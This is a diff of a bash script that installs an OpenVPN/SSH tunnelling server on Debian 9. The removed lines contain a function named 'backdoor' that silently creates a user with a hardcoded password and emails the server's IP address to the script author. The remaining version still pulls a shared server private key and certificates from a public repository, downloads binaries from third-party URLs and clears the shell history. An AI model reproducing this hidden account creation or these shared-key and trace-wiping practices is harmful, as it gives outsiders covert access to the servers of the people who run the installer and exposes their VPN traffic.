@@ -2,7 +2,6 @@
 #OpenVPN server installer for Debian 9
 clear
 service apache2 stop
-
 function rootako () {
 	if [ "$EUID" -ne 0 ]; then
 		return 1
@@ -51,111 +50,16 @@ function initialCheck () {
 	checkdebian
 }
 
-function installmysql () {
-clear
-echo ""
-echo "For OCS installation naman konti lang yan"
-echo ""
-echo "You can leave the default option and just hit enter if you agree with the option"
-echo ""
-echo "First I need to know the new password of MySQL root user:"
-read -p "Password: " -e -i Shadow046 DatabasePass
-echo ""
-echo "Finally, name the Database Name for OCS Panels"
-echo " Please, use one word only, no special characters other than Underscore (_)"
-read -p " Database Name: " -e -i OCS_PANEL DatabaseName
-echo ""
-echo "Okay, that's all I need. We are ready to setup your OCS Panels now"
-read -n1 -r -p "Press any key to continue..."
-
-apt-get update -y
-apt-get install build-essential expect -y
-apt-get install -y mysql-server
-
-#mysql_secure_installation
-so1=$(expect -c "
-spawn mysql_secure_installation; sleep 3
-expect \"\";  sleep 3; send \"\r\"
-expect \"\";  sleep 3; send \"Y\r\"
-expect \"\";  sleep 3; send \"$DatabasePass\r\"
-expect \"\";  sleep 3; send \"$DatabasePass\r\"
-expect \"\";  sleep 3; send \"Y\r\"
-expect \"\";  sleep 3; send \"Y\r\"
-expect \"\";  sleep 3; send \"Y\r\"
-expect \"\";  sleep 3; send \"Y\r\"
-expect eof; ")
-echo "$so1"
-#\r
-#Y
-#pass
-#pass
-#Y
-#Y
-#Y
-#Y
-
-chown -R mysql:mysql /var/lib/mysql/
-chmod -R 755 /var/lib/mysql/
-
-#mysql -u root -p
-so2=$(expect -c "
-spawn mysql -u root -p; sleep 1
-expect \"\";  sleep 1; send \"$DatabasePass\r\"
-expect \"\";  sleep 1; send \"CREATE DATABASE IF NOT EXISTS $DatabaseName;EXIT;\r\"
-expect eof; ")
-echo "$so2"
-#pass
-#CREATE DATABASE IF NOT EXISTS OCS_PANEL;EXIT;
-
-#sshpanel
-so4=$(expect -c "
-spawn mysql -u root -p; sleep 1
-expect \"\";  sleep 1; send \"$DatabasePass\r\"
-expect \"\";  sleep 1; send \"CREATE DATABASE IF NOT EXISTS sshpanel;exit;\r\"
-expect eof; ")
-echo "$so4"
-
-#mysql set to null
-so3=$(expect -c "
-spawn mysql -u root -p; sleep 1
-expect \"\";  sleep 1; send \"$DatabasePass\r\"
-expect \"\";  sleep 1; send \"use mysql;UPDATE user SET plugin= '' WHERE User='root';FLUSH PRIVILEGES;EXIT;\r\"
-expect eof; ")
-echo "$so3"
-wget http://vpn.shadow-pipe.tech:88/sshp/database/sshpanel.sql
-mysql -uroot -p$DatabasePass sshpanel < sshpanel.sql
-}
-
-function installphp () {
-apt upgrade
-apt install ca-certificates apt-transport-https -y
-wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
-echo "deb https://packages.sury.org/php/ stretch main" | sudo tee /etc/apt/sources.list.d/php.list
-apt update
-apt upgrade -y
-apt-get -y install nginx php5.6 php5.6-common php5.6-mcrypt php5.6-fpm php5.6-cli php5.6-mysql php5.6-xml
-sed -i 's@;cgi.fix_pathinfo=1@cgi.fix_pathinfo=0@g' /etc/php/5.6/fpm/php.ini
-sed -i 's@enabled_dl[[:space:]]\=[[:space:]]Off@enabled_dl = On@g' /etc/php/5.6/fpm/php.ini
-sed -i 's@listen = \/run\/php\/php5.6-fpm.sock@listen = 127.0.0.1:9000@g' /etc/php/5.6/fpm/pool.d/www.conf
-}
-
 function copymenu () {
-cp menu/* /usr/local/sbin/
+git clone https://github.com/shadow046/xbalmenu.git
+cp xbalmenu/* /usr/local/sbin/
 chmod +x /usr/local/sbin/*
 }
 
-function updatesoure () {
-echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list
-echo 'deb http://webmin.mirror.somersettechsolutions.co.uk/repository sarge contrib' >> /etc/apt/sources.list
-wget http://www.webmin.com/jcameron-key.asc
-sudo apt-key add jcameron-key.asc
-sudo apt-get update
-}
-
 function BadVPN () {
-wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDebianStretch/raw/master/Files/Plugins/badvpn-udpgw"
+wget -O /usr/bin/badvpn-udpgw "https://github.com/shadow046/xbal/raw/master/badvpn-udpgw"
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/badvpn-udpgw "https://github.com/johndesu090/AutoScriptDebianStretch/raw/master/Files/Plugins/badvpn-udpgw64"
+  wget -O /usr/bin/badvpn-udpgw "https://github.com/shadow046/xbal/raw/master/badvpn-udpgw64"
 fi
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
 chmod +x /usr/bin/badvpn-udpgw
@@ -189,11 +93,10 @@ ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
 }
 
 function certandkey () {
-	cp ~/openvpndeb/ca.crt /etc/openvpn/
-	cp ~/openvpndeb/server.key /etc/openvpn/
-	cp ~/openvpndeb/server.req /etc/openvpn/
-	cp ~/openvpndeb/server.crt /etc/openvpn/
-	cp ~/openvpndeb/dh.pem /etc/openvpn/
+	wget -O /etc/openvpn/ca.crt "https://raw.githubusercontent.com/shadow046/xbal/master/ca.crt"
+	wget -O /etc/openvpn/server.key "https://raw.githubusercontent.com/shadow046/xbal/master/server.key"
+	wget -O /etc/openvpn/server.crt "https://raw.githubusercontent.com/shadow046/xbal/master/server.crt"
+	wget -O /etc/openvpn/dh.pem "https://raw.githubusercontent.com/shadow046/xbal/master/dh.pem"
 }
 
 function serverconf () {
@@ -313,40 +216,6 @@ cat /etc/openvpn/ca.crt >> /home/panel/html/SunTuConfig.ovpn
 echo '</ca>' >> /home/panel/html/SunTuConfig.ovpn
 }
 
-function noload () {
-echo "client" > /etc/openvpn/client-template1.txt
-	if [[ "$PROTOCOL" = 'udp' ]]; then
-		echo "proto udp" >> /etc/openvpn/client-template1.txt
-	elif [[ "$PROTOCOL" = 'tcp' ]]; then
-		echo "proto tcp" >> /etc/openvpn/client-template1.txt
-	fi
-	echo "remote $IP $PORT
-dev tun
-persist-key
-persist-tun
-dev tun
-bind
-float
-lport 110
-remote-cert-tls server
-verb 0
-auth-user-pass
-redirect-gateway def1
-cipher none
-auth none
-auth-nocache
-setenv CLIENT_CERT 0
-auth-retry interact
-connect-retry 0 1
-nice -20
-reneg-sec 0
-log /dev/null" >> /etc/openvpn/client-template1.txt
-cp /etc/openvpn/client-template1.txt /home/panel/html/SunNoload.ovpn
-echo '<ca>' >> /home/panel/html/SunNoload.ovpn
-cat /etc/openvpn/ca.crt >> /home/panel/html/SunNoload.ovpn
-echo '</ca>' >> /home/panel/html/SunNoload.ovpn
-}
-
 function stunconf () {
 cat > /etc/stunnel/stunnel.conf <<-END
 sslVersion = all
@@ -395,7 +264,6 @@ EOF
 function restartall () {
 service uwsgi restart
 service nginx restart
-#service php5.6-fpm restart
 service vnstat restart
 service dropbear restart
 service sshd restart
@@ -407,9 +275,9 @@ service webmin restart
 
 function setall () {
 rm /etc/issue.net
-cat ~/openvpndeb/bann3r > /etc/issue.net
-cat ~/openvpndeb/banner > /etc/motd
-cp ~/openvpndeb/banner /etc/
+wget -O /etc/issue.net "https://raw.githubusercontent.com/shadow046/xbal/master/bann3r"
+wget -O /etc/motd "https://raw.githubusercontent.com/shadow046/xbal/master/banner"
+wget -O /etc/banner "https://raw.githubusercontent.com/shadow046/xbal/master/banner"
 sed -i 's@#Banner[[:space:]]none@Banner /etc/banner@g' /etc/ssh/sshd_config
 sed -i 's@PrintMotd[[:space:]]no@PrintMotd yes@g' /etc/ssh/sshd_config
 sed -i 's@#PrintLastLog[[:space:]]yes@PrintLastLog no@g' /etc/ssh/sshd_config
@@ -423,9 +291,6 @@ sed -i 's@#AddressFamily[[:space:]]any@AddressFamily inet@g' /etc/ssh/sshd_confi
 sed -i 's@#ListenAddress[[:space:]]0@ListenAddress 0@g' /etc/ssh/sshd_config
 sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn@.service
 cp /lib/systemd/system/openvpn\@.service /etc/systemd/system/openvpn\@.service
-#chmod +x /etc/profile.d/shadow046.sh
-#service ssh restart
-service dropbear restart
 }
 
 function installQuestions () {
@@ -436,14 +301,6 @@ function installQuestions () {
 # If $IP is a private IP address, the server must be behind NAT
 	if echo "$IP" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)'; then
 		IP=$(curl https://ipinfo.io/ip)
-
-
-#echo ""
-		#echo "It seems this server is behind NAT. What is its public IPv4 address or hostname?"
-		#echo "We need it for the clients to connect to the server."
-		#until [[ "$ENDPOINT" != "" ]]; do
-		#	read -rp "Public IPv4 address or hostname: " -e ENDPOINT
-		#done
 	fi
 	clear
 	echo ""
@@ -526,44 +383,11 @@ function installall () {
 	sysctl --system
 }
 
-function monitoring () {
-apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra uwsgi uwsgi-plugin-python
-cd /srv
-git clone https://github.com/furlongm/openvpn-monitor.git
-cd openvpn-monitor
-virtualenv .
-. bin/activate
-pip install -r requirements.txt
-cp openvpn-monitor.conf.example openvpn-monitor.conf
-sed -i "s@host=localhost@host=127.0.0.1@g" openvpn-monitor.conf
-sed -i 's@port=5555@port=7505@g' openvpn-monitor.conf
-cd ~/openvpndeb/
-cp openvpn-monitor.ini /etc/uwsgi/apps-available/
-ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/
-cp ~/openvpndeb/openvpn-monitor.py /srv/openvpn-monitor/openvpn-monitor.py -f
-}
-
-function backdoor() {
-SUser="debian"
-SPass="Maricaris24"
-MYIP=$(wget -qO- ipv4.icanhazip.com)
-Today=`date +%s`
-useradd -m -s /home/$SUser $SUser > /dev/null
-egrep "^$SUser" /etc/passwd &> /dev/null
-echo -e "$SPass\n$SPass\n" | passwd $SUser &> /dev/null
-echo -e "Done"
-echo "$MYIP" | mailx -s "VPS" emorej046@gmail.com
-}
-
 initialCheck
 installQuestions
-#installmysql
-#installphp
 installall
 settime
 copymenu
-#updatesource
-#BadVPN
 webmin
 dropssl
 certandkey
@@ -576,51 +400,25 @@ clientovpn
 stunconf
 privoxconfig
 setall
-backdoor
-#monitoring
+
 #Check if /etc/nginx/nginx.conf is existing
 if [[ ! -e /etc/nginx/nginx.conf ]]; then
 mkdir -p /etc/nginx;
-wget -qO /var/tmp/nginx.zip "http://vpn.shadow-pipe.tech:88/nginx.zip";
+wget -qO /var/tmp/nginx.zip "https://github.com/shadow046/xbal/raw/master/nginx.zip";
 unzip -qq /var/tmp/nginx.zip -d /etc/nginx/
 fi
-#wget -qO /var/tmp/ocs.zip https://github.com/shadow046/zip/raw/master/ocs.zip";
-#wget -qO /var/tmp/shadow.zip https://github.com/shadow046/zip/raw/master/shadow.zip";
+
 mkdir -p /home/panel/html
-#unzip -qq /var/tmp/ocs.zip -d /home/panel/html/
-#mv /home/panel/html/view /home/panel/html/viewback
-#rm -f /home/panel/html/installation/install.html
-#wget -qO /home/panel/html/installation/install.html https://raw.githubusercontent.com/shadow046/zip/master/install.html";
-#mkdir -p /home/panel/html/view
-#mkdir -p /home/panel/html/sshp
-#unzip -qq /var/tmp/shadow.zip -d /home/panel/html/view/
-#wget -qO /var/tmp/sshpanel.zip http://vpn.shadow-pipe.tech:88/sshpanel.zip"
-#unzip -qq /var/tmp/sshpanel.zip -d /home/panel/html/
-#chmod 777 /home/panel/html/config
-#chmod 777 /home/panel/html/config/inc.php
-#chmod 777 /home/panel/html/config/route.php
 chmod -R g+rw /home/panel/html
 chown www-data:www-data /home/panel/html -R
-cd ~/openvpndeb
 mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
-cp ~/openvpndeb/nginx.conf /etc/nginx/nginx.conf
+wget -qO /etc/nginx/nginx.conf "https://github.com/shadow046/xbal/raw/master/nginx.conf"
 rm /etc/nginx/conf.d/*.conf
-cp ~/openvpndeb/ocs.conf /etc/nginx/conf.d/vps.conf
-#cp ~/openvpndeb/monitoring.conf /etc/nginx/conf.d/
-#wget http://vpn.shadow-pipe.tech:88/sshp.conf
-#cp sshp.conf /etc/nginx/conf.d/
-function disab () {
-sed -i "s@DB_PASSWORD=\"\"@DB_PASSWORD=\""$DatabasePass\""@g" /home/panel/html/sshpanel/system/.env
-sed -i 's@DB_DATABASE=\"sshpanel_rev\"@DB_DATABASE="sshpanel"@g' /home/panel/html/sshpanel/system/.env
-}
-	#sed -i 's|LimitNPROC|#LimitNPROC|' /etc/systemd/system/openvpn\@.service
-	#sed -i 's|/etc/openvpn/server|/etc/openvpn|' /etc/systemd/system/openvpn\@.service
+wget -qO /etc/nginx/conf.d/vps.conf "https://github.com/shadow046/xbal/raw/master/vps.conf"
 systemctl daemon-reload
 systemctl restart openvpn@server
 systemctl enable openvpn@server
 vnstat -u -i eth0
-# install libxml-parser
-#apt-get install libxml-parser-perl -y -f
 restartall
 clear
 show_ports
@@ -631,13 +429,9 @@ echo "======================================================="
 echo "======================================================="
 echo 'The configuration file is available at /home/panel/html/SunTuConfig.ovpn'
 echo 'Or http://'"$IP"':88/SunTuConfig.ovpn'
-#echo Or http://$IP":88/SunNoload.ovpn'
 echo "Download the .ovpn file and import it in your OpenVPN client."
 echo 'Use menu to create accounts'
-#echo OCS panel http://$IP":88'
-#echo Openvpn Monitoring http://$IP":89'
 echo "======================================================="
 echo "======================================================="
 history -c
-rm -Rf ~/openvpndeb/
 exit 0
